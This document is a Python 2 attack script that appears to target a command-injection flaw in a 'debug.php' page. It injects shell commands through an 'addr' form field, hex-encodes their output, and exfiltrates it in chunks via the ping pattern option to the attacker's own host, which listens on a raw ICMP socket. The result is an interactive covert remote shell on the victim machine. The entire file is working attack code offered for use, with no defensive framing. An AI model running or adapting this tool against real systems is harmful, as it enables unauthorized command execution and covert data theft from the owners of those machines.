#!/usr/bin/env python

import urllib2, urllib,time,socket,struct,re,sys,os

def send_cmd(cmd):
    values = {'addr' : "; " + cmd}
    data = urllib.urlencode(values)
    req = urllib2.Request(URL,data)
    res = urllib2.urlopen(req)
    p = res.read(1024)

def get_somebytes():
    data = sock.recv(1508)
    icmp = data[20:]
    str_len = len(icmp)-4
    pack_format = "!BBH"
    if str_len:
        pack_format += "%ss" % str_len
    unpacked_packet = struct.unpack(pack_format, icmp)
    type, code, checksum = unpacked_packet[:3]
    try:
        msg = unpacked_packet[3]
        ret = re.search('\xb0\x0b(.*?)\x0b\xb0',msg,re.DOTALL).groups()[0]
    except:
        ret = None
    return ret


'''
	To execute a command, we redirect output to a file, then we get the output size,
	we hex the file and we send it over icmp with the pattern option of the ping command.
	We must get the output size because we send the content in multiple chunks.
'''
def execute(cmd):
    outfile = '/tmp/out'
    cmd_str = 'a=$(<{0}); ping -c 1 -w 2 {1} -p b00b`echo {2} | xxd -pS`0bb0'
    send_cmd( '({0} 2>&1 ) | xxd -pS | tr -d "\n" > {1}'.format(cmd,outfile) )
    send_cmd(cmd_str.format(outfile,HOST,'${#a}'))
    out_size = get_somebytes()
    try:
        out_size = int(out_size)
    except:
        print "ERROR SIZE"
        return
    print "SIZE: {0}".format(out_size)
    res = ''
    CHUNK_SIZE = 8
    for i in xrange(0,out_size,CHUNK_SIZE):
        send_cmd(cmd_str.format(outfile,HOST,'${{a:{0}:{1}}}'.format(str(i),str(CHUNK_SIZE) )))
        res += get_somebytes()
    try:
        print "RESULT:\n{0}".format(''.join(res.split('\n')).decode('hex'))
    except TypeError:
        print "Retry command please"


COLOR1 = '\033[94m'
COLOR2 = '\033[95m'
COLOR3 = '\033[93m'
COLOR4 = '\033[91m'
COLOR5 = '\033[92m'
def icmp_shell():
    while True:
        cmd = raw_input("{0}icmp_sh{1}@{2}{3}{4}${5}".format(COLOR1,COLOR2,COLOR3,VICTIM,COLOR4,COLOR5))
        if cmd == 'exit':
            break
        execute(cmd)

if __name__ == "__main__":
    try:
        if os.geteuid() != 0:
            print "This script needs root privileges!"
            sys.exit(0)
        if len(sys.argv) != 3:
            print 'Usage: {0} [VICTIM] [THIS HOST]'.format(sys.argv[0])
            sys.exit(0)
        VICTIM = sys.argv[1]
        HOST = sys.argv[2]
        URL='http://' + VICTIM + '/debug.php'
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.bind(('', 33434))
        icmp_shell()
        print "GOOD BYE!"
    except:
        print "AN ERROR HAS OCCURED! :("

